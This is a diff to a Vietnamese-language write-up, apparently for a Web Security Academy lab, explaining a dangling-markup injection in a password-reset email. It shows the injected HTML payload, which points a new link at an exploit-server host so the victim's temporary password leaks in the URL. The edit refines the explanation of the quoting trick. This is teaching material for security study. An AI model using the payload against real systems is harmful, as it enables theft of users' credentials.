@@ -164,9 +164,9 @@ Khi backend ghép nối chuỗi này vào mẫu email, đoạn mã HTML kết qu
 <p>Please <a href='https://0a5400430459246181ac7fc100d80008.web-security-academy.net:'<a href="//exploit-0a35004f0411246181257e44012400a6.exploit-server.net/?/login'>click here</a>....
 ```
 
-* **Cơ chế kích hoạt**: Dấu nháy đơn ngay sau dấu hai chấm sẽ đóng thuộc tính `href='` ban đầu.
-* **Nuốt mã HTML**: Thẻ `<a href="//exploit-server/?` mới được mở ra với dấu ngoặc kép chưa có phần đóng.
-* **Hệ quả**: Trình xử lý HTML sẽ coi toàn bộ văn bản tiếp theo (bao gồm phần chứa mật khẩu tạm thời) là giá trị của thuộc tính `href` và gửi kèm vào đường dẫn truy vấn khi nạn nhân mở liên kết.
+* **Đóng thuộc tính ban đầu bằng dấu nháy đơn (`'`)**: Dấu nháy đơn ngay sau dấu hai chấm (`:'`) sẽ lập tức đóng thuộc tính `href='` ban đầu của email gốc: `<a href='https://victim.net:'`.
+* **Nuốt dữ liệu bằng dấu nháy kép (`"`)**: Thẻ mới được mở ra bằng dấu nháy kép `<a href="//exploit-server/?...`. Mẫu email gốc có chuỗi `/login'>` ngay sau vị trí chèn. Nếu dùng dấu nháy đơn (`'`), trình duyệt sẽ gặp dấu `'` sau `/login` và đóng `href` ngay lập tức, khiến mật khẩu không bị nuốt. Khi mở bằng dấu nháy kép (`"`), trình duyệt bắt buộc phải tìm dấu `"` tiếp theo mới đóng thuộc tính, từ đó bỏ qua hoàn toàn dấu nháy đơn `'` cùng các thẻ đóng `>` và `</a>`, tiếp tục nuốt chửng toàn bộ nội dung tiếp theo (bao gồm cả mật khẩu tạm thời) cho đến khi gặp dấu `"` tiếp theo.
+* **Hệ quả**: Toàn bộ khối văn bản bị nuốt sẽ trở thành giá trị của thuộc tính `href` và gửi kèm vào đường dẫn truy vấn về Exploit Server khi nạn nhân tương tác với liên kết.
 
 > [!NOTE]
 > **Tại sao sử dụng `//exploit-server.net` thay vì `https://exploit-server.net`?**
